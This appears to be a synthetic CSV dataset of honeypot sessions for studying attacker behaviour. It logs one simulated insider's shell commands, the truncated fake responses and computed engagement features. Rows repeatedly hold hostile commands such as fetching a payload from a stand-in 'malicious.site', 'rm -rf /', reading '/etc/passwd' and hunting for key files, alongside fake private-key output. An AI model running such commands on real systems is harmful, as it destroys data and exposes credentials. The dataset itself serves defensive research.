session_id,attacker_id,attacker_profile,timestamp,attacker_input,honeypot_response,attack_type,risk_level,response_success,current_privileges,failed_attempts,session_position,attack_phase,engagement_time,hawkes_intensity,frustration_level,temporal_phase,deception_triggered,data_collected,privilege_escalation_attempt,high_risk_activity,system_state_hash,time_since_session_start,commands_per_minute
5,4,insider_threat,2025-05-24 23:37:32.480282,ls,admin_backup.sql  private_key.pem  server_credentials.txt  passwords.txt  api_keys.txt  .bash_histor...,reconnaissance,1,True,False,0,38,initial_recon,0.1069385654829133,0.1000001600639491,0.0,initial_recon,1,0,0,0,-8958916735605131775,23.24448975578908,28.60222503430908
5,4,insider_threat,2025-05-24 23:37:32.587221,cat private_key.pem,"-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEA2K8Qn5mJ7vL9sF2nR8tY3kP6wE9xC4vB7mN1qS8dF5gH2jK
L9pM...",data_exfiltration,4,True,False,0,39,initial_recon,0.2393569676041187,0.1000000988568508,0.0,initial_recon,1,1,0,1,-8958916735605131775,23.4838467233932,28.60222503430908
5,4,insider_threat,2025-05-24 23:37:32.826578,sudo su,Command executed,privilege_escalation,5,False,False,1,40,initial_recon,1.3350268806392789,0.1000000611088023,0.0,initial_recon,1,0,1,1,-8958916735605131775,24.81887360403248,28.60222503430908
5,4,insider_threat,2025-05-24 23:37:34.161605,ls -la,"total 48
drwxr-xr-x 2 user user 4096 May 24 18:00 .
drwxr-xr-x 3 user user 4096 May 20 10:30 ..
-rw-...",reconnaissance,1,True,False,0,41,initial_recon,0.1185488578006832,0.1000000382697562,0.2,initial_recon,1,0,0,0,-8958916735605131775,24.93742246183316,28.60222503430908
5,4,insider_threat,2025-05-24 23:37:34.280153,cat admin_backup.sql,"-- MySQL dump 10.13  Distrib 8.0.28, for Linux (x86_64)
-- Host: localhost    Database: company_db
-...",data_exfiltration,3,True,False,0,42,initial_recon,0.6297335259653339,0.100000023609729,0.1,initial_recon,1,1,0,0,-8958916735605131775,25.567155987798497,28.60222503430908
5,4,insider_threat,2025-05-24 23:37:34.909887,whoami,user,reconnaissance,1,True,False,0,43,initial_recon,0.1,0.1000000146316852,0.0,initial_recon,1,0,0,0,-8958916735605131775,25.66715598779849,28.60222503430908
5,4,insider_threat,2025-05-24 23:37:35.009887,wget http://malicious.site/payload,Command executed,data_exfiltration,4,False,False,1,44,initial_recon,0.3024793448355268,0.1000000090196112,0.0,initial_recon,1,0,0,1,-8958916735605131775,25.969635332634024,28.60222503430908
5,4,insider_threat,2025-05-24 23:37:35.312366,find / -name '*.key',Command not found,data_exfiltration,3,False,False,2,45,initial_recon,0.761487879855164,0.1000000055680183,0.2,initial_recon,1,0,0,0,-8958916735605131775,26.731123212489187,28.60222503430908
5,4,insider_threat,2025-05-24 23:37:36.073854,ls -la,"total 48
drwxr-xr-x 2 user user 4096 May 24 18:00 .
drwxr-xr-x 3 user user 4096 May 20 10:30 ..
-rw-...",reconnaissance,1,True,False,1,46,initial_recon,0.1904633320931689,0.1000000034514502,0.4,initial_recon,1,0,0,0,-8958916735605131775,26.921586544582357,28.60222503430908
5,4,insider_threat,2025-05-24 23:37:36.264318,cat private_key.pem,"-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEA2K8Qn5mJ7vL9sF2nR8tY3kP6wE9xC4vB7mN1qS8dF5gH2jK
L9pM...",data_exfiltration,4,True,False,0,47,initial_recon,0.1904557764493673,0.1000000021272719,0.3,initial_recon,1,1,0,1,-8958916735605131775,27.112042321031723,28.60222503430908
5,4,insider_threat,2025-05-24 23:37:36.454773,wget http://malicious.site/payload,Command executed,data_exfiltration,4,True,False,0,48,initial_recon,1.419591406226612,0.1000000013107935,0.2,initial_recon,1,1,0,1,-8958916735605131775,28.53163372725833,28.60222503430908
5,4,insider_threat,2025-05-24 23:37:37.874365,cat /etc/passwd,"root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/...",reconnaissance,2,True,False,0,49,initial_recon,0.985367317408588,0.1000000008180676,0.1,initial_recon,1,0,0,0,-8958916735605131775,29.517001044666923,28.60222503430908
5,4,insider_threat,2025-05-24 23:37:38.859732,ls -la,"total 48
drwxr-xr-x 2 user user 4096 May 24 18:00 .
drwxr-xr-x 3 user user 4096 May 20 10:30 ..
-rw-...",reconnaissance,1,True,False,0,50,initial_recon,0.1,0.1000000005074258,2.775557561562892e-17,initial_recon,1,0,0,0,-8958916735605131775,29.61700104466692,28.60222503430908
5,4,insider_threat,2025-05-24 23:37:38.959732,cat admin_backup.sql,"-- MySQL dump 10.13  Distrib 8.0.28, for Linux (x86_64)
-- Host: localhost    Database: company_db
-...",data_exfiltration,3,True,False,0,51,initial_recon,0.8976876484757793,0.1000000003121493,0.0,initial_recon,1,1,0,0,-8958916735605131775,30.514688693142705,28.60222503430908
5,4,insider_threat,2025-05-24 23:37:39.857420,whoami,user,reconnaissance,1,False,False,1,52,initial_recon,0.1,0.1000000001932867,0.0,initial_recon,1,0,0,0,-8958916735605131775,30.6146886931427,28.60222503430908
5,4,insider_threat,2025-05-24 23:37:39.957420,cat private_key.pem,"-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEA2K8Qn5mJ7vL9sF2nR8tY3kP6wE9xC4vB7mN1qS8dF5gH2jK
L9pM...",data_exfiltration,4,True,False,0,53,initial_recon,0.477643168341639,0.1000000001188456,0.2,initial_recon,1,1,0,1,-8958916735605131775,31.09233186148434,28.60222503430908
5,4,insider_threat,2025-05-24 23:37:40.435063,ls,admin_backup.sql  private_key.pem  server_credentials.txt  passwords.txt  api_keys.txt  .bash_histor...,reconnaissance,1,True,False,0,54,initial_recon,0.2140605441910567,0.100000000073264,0.1,initial_recon,1,0,0,0,-8958916735605131775,31.3063924056754,28.60222503430908
5,4,insider_threat,2025-05-24 23:37:40.649123,cat private_key.pem,"-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEA2K8Qn5mJ7vL9sF2nR8tY3kP6wE9xC4vB7mN1qS8dF5gH2jK
L9pM...",data_exfiltration,4,True,False,0,55,initial_recon,0.3518076641994579,0.1000000000450643,0.0,initial_recon,1,1,0,1,-8958916735605131775,31.65820006987485,28.60222503430908
5,4,insider_threat,2025-05-24 23:37:41.000931,find / -name '*.key',Command not found,data_exfiltration,3,False,False,1,56,initial_recon,0.5408742271794371,0.1000000000277407,0.0,initial_recon,1,0,0,0,-8958916735605131775,32.199074297054295,28.60222503430908
5,4,insider_threat,2025-05-24 23:37:41.541805,find / -name '*.key',Command not found,data_exfiltration,3,False,False,2,57,initial_recon,1.1023793718231671,0.1000000000170974,0.2,initial_recon,1,0,0,0,-8958916735605131775,33.30145366887746,28.60222503430908
5,4,insider_threat,2025-05-24 23:37:42.644185,sudo su,Command executed,privilege_escalation,5,False,False,3,58,initial_recon,0.1,0.1000000000105884,0.4,initial_recon,1,0,1,1,-8958916735605131775,33.40145366887746,28.60222503430908
5,4,insider_threat,2025-05-24 23:37:42.744185,wget http://malicious.site/payload,Command executed,data_exfiltration,4,True,False,2,59,initial_recon,0.6532630589007268,0.1000000000065025,0.6000000000000001,initial_recon,1,1,0,1,-8958916735605131775,34.054716727778185,28.60222503430908
5,4,insider_threat,2025-05-24 23:37:43.397448,ls,admin_backup.sql  private_key.pem  server_credentials.txt  passwords.txt  api_keys.txt  .bash_histor...,reconnaissance,1,True,False,1,60,initial_recon,1.206300216162431,0.1000000000040081,0.5000000000000001,initial_recon,1,0,0,0,-8958916735605131775,35.26101694394062,28.60222503430908
5,4,insider_threat,2025-05-24 23:37:44.603748,cat private_key.pem,"-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEA2K8Qn5mJ7vL9sF2nR8tY3kP6wE9xC4vB7mN1qS8dF5gH2jK
L9pM...",data_exfiltration,4,True,False,0,61,initial_recon,1.1048118028951404,0.1000000000024824,0.4000000000000001,initial_recon,1,1,0,1,-8958916735605131775,36.36582874683576,28.60222503430908
5,4,insider_threat,2025-05-24 23:37:45.708560,ls,admin_backup.sql  private_key.pem  server_credentials.txt  passwords.txt  api_keys.txt  .bash_histor...,reconnaissance,1,True,False,0,62,initial_recon,0.1314891293780779,0.1000000000015352,0.3000000000000001,initial_recon,1,0,0,0,-8958916735605131775,36.49731787621384,28.60222503430908
5,4,insider_threat,2025-05-24 23:37:45.840049,cat admin_backup.sql,"-- MySQL dump 10.13  Distrib 8.0.28, for Linux (x86_64)
-- Host: localhost    Database: company_db
-...",data_exfiltration,3,True,False,0,63,initial_recon,0.781270341034784,0.1000000000009421,0.2000000000000001,initial_recon,1,1,0,0,-8958916735605131775,37.27858821724862,28.60222503430908
5,4,insider_threat,2025-05-24 23:37:46.621319,wget http://malicious.site/payload,Command executed,data_exfiltration,4,False,False,1,64,initial_recon,0.4669535005821722,0.1000000000005807,0.1000000000000001,initial_recon,1,0,0,1,-8958916735605131775,37.74554171783079,28.60222503430908
5,4,insider_threat,2025-05-24 23:37:47.088273,sudo su,Command executed,privilege_escalation,5,False,False,2,65,initial_recon,0.1509552602450976,0.100000000000357,0.3000000000000001,initial_recon,1,0,1,1,-8958916735605131775,37.89649697807589,28.60222503430908
5,4,insider_threat,2025-05-24 23:37:47.239228,cat private_key.pem,"-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEA2K8Qn5mJ7vL9sF2nR8tY3kP6wE9xC4vB7mN1qS8dF5gH2jK
L9pM...",data_exfiltration,4,True,False,1,66,initial_recon,1.7842064306174938,0.100000000000219,0.5000000000000002,initial_recon,1,1,0,1,-8958916735605131775,39.68070340869338,28.60222503430908
5,4,insider_threat,2025-05-24 23:37:49.023434,cat admin_backup.sql,"-- MySQL dump 10.13  Distrib 8.0.28, for Linux (x86_64)
-- Host: localhost    Database: company_db
-...",data_exfiltration,3,True,False,0,67,initial_recon,0.2726554216343174,0.1000000000001363,0.4000000000000002,initial_recon,1,1,0,0,-8958916735605131775,39.9533588303277,28.60222503430908
5,4,insider_threat,2025-05-24 23:37:49.296090,wget http://malicious.site/payload,Command executed,data_exfiltration,4,True,False,0,68,initial_recon,0.244968684278805,0.1000000000000836,0.3000000000000002,initial_recon,1,1,0,1,-8958916735605131775,40.1983275146065,28.60222503430908
5,4,insider_threat,2025-05-24 23:37:49.541059,ls -la,"total 48
drwxr-xr-x 2 user user 4096 May 24 18:00 .
drwxr-xr-x 3 user user 4096 May 20 10:30 ..
-rw-...",reconnaissance,1,True,False,0,69,initial_recon,0.1991749570777475,0.1000000000000513,0.2000000000000002,initial_recon,1,0,0,0,-8958916735605131775,40.397502471684255,28.60222503430908
5,4,insider_threat,2025-05-24 23:37:49.740233,cat private_key.pem,"-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEA2K8Qn5mJ7vL9sF2nR8tY3kP6wE9xC4vB7mN1qS8dF5gH2jK
L9pM...",data_exfiltration,4,True,False,0,70,initial_recon,0.1,0.1000000000000315,0.1000000000000002,initial_recon,1,1,0,1,-8958916735605131775,40.49750247168425,28.60222503430908
5,4,insider_threat,2025-05-24 23:37:49.840233,cat /etc/passwd,"root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/...",reconnaissance,2,True,False,0,71,initial_recon,0.1,0.1000000000000192,2.498001805406602e-16,initial_recon,1,0,0,0,-8958916735605131775,40.59750247168425,28.60222503430908
5,4,insider_threat,2025-05-24 23:37:49.940233,cat admin_backup.sql,"-- MySQL dump 10.13  Distrib 8.0.28, for Linux (x86_64)
-- Host: localhost    Database: company_db
-...",data_exfiltration,3,True,False,0,72,initial_recon,0.2393901391681132,0.1000000000000118,0.0,initial_recon,1,1,0,0,-8958916735605131775,40.83689261085237,28.60222503430908
5,4,insider_threat,2025-05-24 23:37:50.179624,sudo su,Permission denied,privilege_escalation,5,True,True,0,73,initial_recon,0.4212425302142309,0.1000000000000072,0.0,initial_recon,1,0,1,1,-8958916735605131775,41.2581351410666,28.60222503430908
5,4,insider_threat,2025-05-24 23:37:50.600866,wget http://malicious.site/payload,Command executed,data_exfiltration,4,False,True,1,74,initial_recon,0.2606660228441939,0.1000000000000043,0.2,initial_recon,1,0,0,1,-8958916735605131775,41.5188011639108,28.60222503430908
5,4,insider_threat,2025-05-24 23:37:50.861532,crontab -e,Command executed,persistence,3,False,True,2,75,initial_recon,0.3186549220219717,0.1000000000000027,0.4,initial_recon,1,0,0,0,-8958916735605131775,41.83745608593277,28.60222503430908
5,4,insider_threat,2025-05-24 23:37:51.180187,rm -rf /,Command executed,destruction,5,False,True,3,76,initial_recon,0.444062218327803,0.1000000000000015,0.6000000000000001,initial_recon,1,0,0,1,-8958916735605131775,42.281518304260565,28.60222503430908
5,4,insider_threat,2025-05-24 23:37:51.624249,wget http://malicious.site/payload,Command executed,data_exfiltration,4,True,True,2,77,initial_recon,3.0184896918114967,0.1000000000000011,0.8,initial_recon,1,1,0,1,-8958916735605131775,45.30000799607206,28.60222503430908
5,4,insider_threat,2025-05-24 23:37:54.642739,ls,admin_backup.sql  private_key.pem  server_credentials.txt  passwords.txt  api_keys.txt  .bash_histor...,reconnaissance,1,True,True,1,78,initial_recon,4.0850728261839855,0.1000000000000004,0.7000000000000001,initial_recon,1,0,0,0,-8958916735605131775,49.38508082225605,28.60222503430908
5,4,insider_threat,2025-05-24 23:37:58.727812,cat admin_backup.sql,"-- MySQL dump 10.13  Distrib 8.0.28, for Linux (x86_64)
-- Host: localhost    Database: company_db
-...",data_exfiltration,3,True,True,0,79,initial_recon,1.3152014157268792,0.1000000000000001,0.6000000000000001,initial_recon,1,1,0,0,-8958916735605131775,50.700282237982925,28.60222503430908
5,4,insider_threat,2025-05-24 23:38:00.043013,wget http://malicious.site/payload,Command executed,data_exfiltration,4,False,True,1,80,initial_recon,1.788971142990608,0.1,0.5000000000000001,initial_recon,1,0,0,1,-8958916735605131775,52.48925338097354,28.60222503430908
5,4,insider_threat,2025-05-24 23:38:01.831984,cat admin_backup.sql,"-- MySQL dump 10.13  Distrib 8.0.28, for Linux (x86_64)
-- Host: localhost    Database: company_db
-...",data_exfiltration,3,True,True,0,81,initial_recon,0.1665106044080518,0.1,0.7000000000000002,initial_recon,1,1,0,0,-8958916735605131775,52.65576398538159,28.60222503430908
5,4,insider_threat,2025-05-24 23:38:01.998495,cat admin_backup.sql,"-- MySQL dump 10.13  Distrib 8.0.28, for Linux (x86_64)
-- Host: localhost    Database: company_db
-...",data_exfiltration,3,True,True,0,82,initial_recon,5.437548901073763,0.1,0.6000000000000002,initial_recon,1,1,0,0,-8958916735605131775,58.09331288645535,28.60222503430908
5,4,insider_threat,2025-05-24 23:38:07.436044,rm -rf /,Command executed,destruction,5,False,True,1,83,initial_recon,2.6204642200700285,0.1,0.5000000000000002,initial_recon,1,0,0,1,-8958916735605131775,60.71377710652538,28.60222503430908
5,4,insider_threat,2025-05-24 23:38:10.056508,wget http://malicious.site/payload,Command executed,data_exfiltration,4,False,True,2,84,initial_recon,5.173131381588053,0.1,0.7000000000000002,initial_recon,1,0,0,1,-8958916735605131775,65.88690848811343,28.60222503430908
5,4,insider_threat,2025-05-24 23:38:15.229639,wget http://malicious.site/payload,Command executed,data_exfiltration,4,True,True,1,85,initial_recon,0.8108342270193429,0.1,0.9000000000000001,initial_recon,1,1,0,1,-8958916735605131775,66.69774271513278,28.60222503430908
5,4,insider_threat,2025-05-24 23:38:16.040474,whoami,user,reconnaissance,1,False,True,2,86,initial_recon,4.835218649944895,0.1,0.8000000000000002,initial_recon,1,0,0,0,-8958916735605131775,71.53296136507767,28.60222503430908
5,4,insider_threat,2025-05-24 23:38:20.875692,sudo su,Command executed,privilege_escalation,5,False,True,3,87,initial_recon,11.482324303636052,0.1,1.0000000000000002,initial_recon,1,0,1,1,-8958916735605131775,83.01528566871372,28.60222503430908
5,4,insider_threat,2025-05-24 23:38:32.358017,ls -la,"total 48
drwxr-xr-x 2 user user 4096 May 24 18:00 .
drwxr-xr-x 3 user user 4096 May 20 10:30 ..
-rw-...",reconnaissance,1,True,True,2,88,initial_recon,0.2424206416889867,0.1,1.2000000000000002,initial_recon,1,0,0,0,-8958916735605131775,83.25770631040271,28.60222503430908
5,4,insider_threat,2025-05-24 23:38:32.600437,cat private_key.pem,"-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEA2K8Qn5mJ7vL9sF2nR8tY3kP6wE9xC4vB7mN1qS8dF5gH2jK
L9pM...",data_exfiltration,4,True,True,1,89,initial_recon,2.335219534798203,0.1,1.1,initial_recon,1,1,0,1,-8958916735605131775,85.59292584520091,28.60222503430908
5,4,insider_threat,2025-05-24 23:38:34.935657,rm -rf /,Command executed,destruction,5,False,True,2,90,initial_recon,7.318743247425573,0.1,1.0,initial_recon,1,0,0,1,-8958916735605131775,92.91166909262648,28.60222503430908
5,4,insider_threat,2025-05-24 23:38:42.254400,find / -name '*.key',Command not found,data_exfiltration,3,False,True,3,91,initial_recon,1.6996920942674307,0.1,1.2,initial_recon,1,0,0,0,-8958916735605131775,94.61136118689392,28.60222503430908
5,4,insider_threat,2025-05-24 23:38:43.954092,rm -rf /,Command executed,destruction,5,False,True,4,92,initial_recon,1.786054328303373,0.1,1.4,initial_recon,1,0,0,1,-8958916735605131775,96.39741551519728,28.60222503430908
5,4,insider_threat,2025-05-24 23:38:45.740147,crontab -e,Command executed,persistence,3,True,True,3,93,initial_recon,10.06114216639286,0.1,1.6,initial_recon,1,0,0,0,-8958916735605131775,106.45855768159016,28.60222503430908
5,4,insider_threat,2025-05-24 23:38:55.801289,ls -la,"total 48
drwxr-xr-x 2 user user 4096 May 24 18:00 .
drwxr-xr-x 3 user user 4096 May 20 10:30 ..
-rw-...",reconnaissance,1,True,True,2,94,initial_recon,3.695831349359718,0.1,1.4999999999999998,initial_recon,1,0,0,0,-8958916735605131775,110.15438903094986,28.60222503430908
5,4,insider_threat,2025-05-24 23:38:59.497120,cat admin_backup.sql,"-- MySQL dump 10.13  Distrib 8.0.28, for Linux (x86_64)
-- Host: localhost    Database: company_db
-...",data_exfiltration,3,True,True,1,95,initial_recon,0.1631954895504382,0.1,1.3999999999999997,initial_recon,1,1,0,0,-8958916735605131775,110.3175845205003,28.60222503430908
5,4,insider_threat,2025-05-24 23:38:59.660316,sudo su,Permission denied,privilege_escalation,5,True,True,0,96,initial_recon,3.7009457545556073,0.1,1.2999999999999996,initial_recon,1,0,1,1,-8958916735605131775,114.01853027505592,28.60222503430908
5,4,insider_threat,2025-05-24 23:39:03.361261,sudo su,Command executed,privilege_escalation,5,True,True,0,97,initial_recon,5.852234894123377,0.1,1.3999999999999997,initial_recon,1,0,1,1,-8958916735605131775,119.8707651691793,28.60222503430908
5,4,insider_threat,2025-05-24 23:39:09.213496,ls,admin_backup.sql  private_key.pem  server_credentials.txt  passwords.txt  api_keys.txt  .bash_histor...,reconnaissance,1,True,True,0,98,initial_recon,7.6912736095140115,0.1,1.2999999999999994,initial_recon,1,0,0,0,-8958916735605131775,127.5620387786933,28.60222503430908
5,4,insider_threat,2025-05-24 23:39:16.904770,cat private_key.pem,"-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEA2K8Qn5mJ7vL9sF2nR8tY3kP6wE9xC4vB7mN1qS8dF5gH2jK
L9pM...",data_exfiltration,4,True,True,0,99,initial_recon,8.472087325633167,0.1,1.1999999999999993,initial_recon,1,1,0,1,-8958916735605131775,136.03412610432648,28.60222503430908
5,4,insider_threat,2025-05-24 23:39:25.376857,cat /etc/passwd,"root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/...",reconnaissance,2,True,True,0,100,initial_recon,0.9232582045910364,0.1,1.0999999999999992,initial_recon,1,0,0,0,-8958916735605131775,136.9573843089175,28.60222503430908
5,4,insider_threat,2025-05-24 23:39:26.300115,crontab -e,Command executed,persistence,3,False,True,1,101,initial_recon,2.6402605894063624,0.1,0.9999999999999992,initial_recon,1,0,0,0,-8958916735605131775,139.59764489832386,28.60222503430908
5,4,insider_threat,2025-05-24 23:39:28.940376,rm -rf /,Command executed,destruction,5,True,True,0,102,initial_recon,3.040314807998896,0.1,1.1999999999999993,initial_recon,1,0,0,1,-8958916735605131775,142.63795970632276,28.60222503430908
5,4,insider_threat,2025-05-24 23:39:31.980691,ls,admin_backup.sql  private_key.pem  server_credentials.txt  passwords.txt  api_keys.txt  .bash_histor...,reconnaissance,1,True,True,0,103,initial_recon,3.1933497653269,0.1,1.0999999999999992,initial_recon,1,0,0,0,-8958916735605131775,145.83130947164966,28.60222503430908
5,4,insider_threat,2025-05-24 23:39:35.174040,cat admin_backup.sql,"-- MySQL dump 10.13  Distrib 8.0.28, for Linux (x86_64)
-- Host: localhost    Database: company_db
-...",data_exfiltration,3,True,True,0,104,initial_recon,7.250846577582795,0.1,0.9999999999999992,initial_recon,1,1,0,0,-8958916735605131775,153.08215604923245,28.60222503430908
5,4,insider_threat,2025-05-24 23:39:42.424887,wget http://malicious.site/payload,Command executed,data_exfiltration,4,False,True,1,105,initial_recon,6.76249619275178,0.1,0.8999999999999992,initial_recon,1,0,0,1,-8958916735605131775,159.84465224198425,28.60222503430908
5,4,insider_threat,2025-05-24 23:39:49.187383,sudo su,Command executed,privilege_escalation,5,False,True,2,106,initial_recon,2.148933109436725,0.1,1.0999999999999992,initial_recon,1,0,1,1,-8958916735605131775,161.99358535142096,28.60222503430908
5,4,insider_threat,2025-05-24 23:39:51.336316,cat private_key.pem,"-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEA2K8Qn5mJ7vL9sF2nR8tY3kP6wE9xC4vB7mN1qS8dF5gH2jK
L9pM...",data_exfiltration,4,True,True,1,107,initial_recon,6.083190251141795,0.1,1.2999999999999992,initial_recon,1,1,0,1,-8958916735605131775,168.07677560256275,28.60222503430908
5,4,insider_threat,2025-05-24 23:39:57.419507,wget http://malicious.site/payload,Command executed,data_exfiltration,4,False,True,2,108,initial_recon,3.447429749496598,0.1,1.199999999999999,initial_recon,1,0,0,1,-8958916735605131775,171.52420535205934,28.60222503430908
5,4,insider_threat,2025-05-24 23:40:00.866936,wget http://malicious.site/payload,Command executed,data_exfiltration,4,True,True,1,109,initial_recon,4.360809224584508,0.1,1.399999999999999,initial_recon,1,1,0,1,-8958916735605131775,175.88501457664387,28.60222503430908
5,4,insider_threat,2025-05-24 23:40:05.227746,find / -name '*.key',Command not found,data_exfiltration,3,False,True,2,110,initial_recon,3.0719893476360243,0.1,1.299999999999999,initial_recon,1,0,0,0,-8958916735605131775,178.9570039242799,28.60222503430908
5,4,insider_threat,2025-05-24 23:40:08.299735,ls -la,"total 48
drwxr-xr-x 2 user user 4096 May 24 18:00 .
drwxr-xr-x 3 user user 4096 May 20 10:30 ..
-rw-...",reconnaissance,1,True,True,1,111,initial_recon,3.0871669370092367,0.1,1.499999999999999,initial_recon,1,0,0,0,-8958916735605131775,182.04417086128916,28.60222503430908
5,4,insider_threat,2025-05-24 23:40:11.386902,cat private_key.pem,"-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEA2K8Qn5mJ7vL9sF2nR8tY3kP6wE9xC4vB7mN1qS8dF5gH2jK
L9pM...",data_exfiltration,4,True,True,0,112,initial_recon,5.3584679078149895,0.1,1.3999999999999988,initial_recon,1,1,0,1,-8958916735605131775,187.4026387691041,28.60222503430908
5,4,insider_threat,2025-05-24 23:40:16.745370,find / -name '*.key',Command not found,data_exfiltration,3,False,True,1,113,initial_recon,4.62684276525354,0.1,1.2999999999999987,initial_recon,1,0,0,0,-8958916735605131775,192.02948153435764,28.60222503430908
5,4,insider_threat,2025-05-24 23:40:21.372213,ls -la,"total 48
drwxr-xr-x 2 user user 4096 May 24 18:00 .
drwxr-xr-x 3 user user 4096 May 20 10:30 ..
-rw-...",reconnaissance,1,True,True,0,114,initial_recon,2.068309179014328,0.1,1.499999999999999,initial_recon,1,0,0,0,-8958916735605131775,194.097790713372,28.60222503430908
5,4,insider_threat,2025-05-24 23:40:23.440522,cat admin_backup.sql,"-- MySQL dump 10.13  Distrib 8.0.28, for Linux (x86_64)
-- Host: localhost    Database: company_db
-...",data_exfiltration,3,True,True,0,115,initial_recon,0.6522632178605241,0.1,1.3999999999999986,initial_recon,1,1,0,0,-8958916735605131775,194.7500539312325,28.60222503430908
5,4,insider_threat,2025-05-24 23:40:24.092785,cat admin_backup.sql,"-- MySQL dump 10.13  Distrib 8.0.28, for Linux (x86_64)
-- Host: localhost    Database: company_db
-...",data_exfiltration,3,True,True,0,116,initial_recon,2.993310749404672,0.1,1.2999999999999985,initial_recon,1,1,0,0,-8958916735605131775,197.7433646806372,28.60222503430908
5,4,insider_threat,2025-05-24 23:40:27.086096,sudo su,Command executed,privilege_escalation,5,True,True,0,117,initial_recon,3.48430963068195,0.1,1.1999999999999984,initial_recon,1,0,1,1,-8958916735605131775,201.22767431131916,28.60222503430908
5,4,insider_threat,2025-05-24 23:40:30.570405,cat admin_backup.sql,"-- MySQL dump 10.13  Distrib 8.0.28, for Linux (x86_64)
-- Host: localhost    Database: company_db
-...",data_exfiltration,3,True,True,0,118,initial_recon,2.4913879041902844,0.1,1.0999999999999983,initial_recon,1,1,0,0,-8958916735605131775,203.7190622155094,28.60222503430908
5,4,insider_threat,2025-05-24 23:40:33.061793,ls,admin_backup.sql  private_key.pem  server_credentials.txt  passwords.txt  api_keys.txt  .bash_histor...,reconnaissance,1,True,True,0,119,initial_recon,0.7425740658293306,0.1,0.9999999999999984,initial_recon,1,0,0,0,-8958916735605131775,204.46163628133877,28.60222503430908
5,4,insider_threat,2025-05-24 23:40:33.804367,cat admin_backup.sql,"-- MySQL dump 10.13  Distrib 8.0.28, for Linux (x86_64)
-- Host: localhost    Database: company_db
-...",data_exfiltration,3,True,True,0,120,initial_recon,1.1629619448586876,0.1,0.8999999999999984,initial_recon,1,1,0,0,-8958916735605131775,205.62459822619743,28.60222503430908
5,4,insider_threat,2025-05-24 23:40:34.967329,crontab -e,Command executed,persistence,3,True,True,0,121,initial_recon,2.149514713667003,0.1,0.7999999999999984,initial_recon,1,0,0,0,-8958916735605131775,207.77411293986444,28.60222503430908
5,4,insider_threat,2025-05-24 23:40:37.116844,cat admin_backup.sql,"-- MySQL dump 10.13  Distrib 8.0.28, for Linux (x86_64)
-- Host: localhost    Database: company_db
-...",data_exfiltration,3,True,True,0,122,initial_recon,2.136165293241288,0.1,0.6999999999999984,initial_recon,1,1,0,0,-8958916735605131775,209.9102782331057,28.60222503430908
5,4,insider_threat,2025-05-24 23:40:39.253009,ls -la,"total 48
drwxr-xr-x 2 user user 4096 May 24 18:00 .
drwxr-xr-x 3 user user 4096 May 20 10:30 ..
-rw-...",reconnaissance,1,True,True,0,123,initial_recon,0.3711237369607854,0.1,0.5999999999999984,initial_recon,1,0,0,0,-8958916735605131775,210.2814019700665,28.60222503430908
5,4,insider_threat,2025-05-24 23:40:39.624133,cat admin_backup.sql,"-- MySQL dump 10.13  Distrib 8.0.28, for Linux (x86_64)
-- Host: localhost    Database: company_db
-...",data_exfiltration,3,True,True,0,124,initial_recon,0.2832328118878984,0.1,0.4999999999999984,initial_recon,1,1,0,0,-8958916735605131775,210.5646347819544,28.60222503430908
5,4,insider_threat,2025-05-24 23:40:39.907366,crontab -e,Command executed,persistence,3,False,True,1,125,initial_recon,0.3401614623279765,0.1,0.3999999999999984,initial_recon,1,0,0,0,-8958916735605131775,210.9047962442824,28.60222503430908
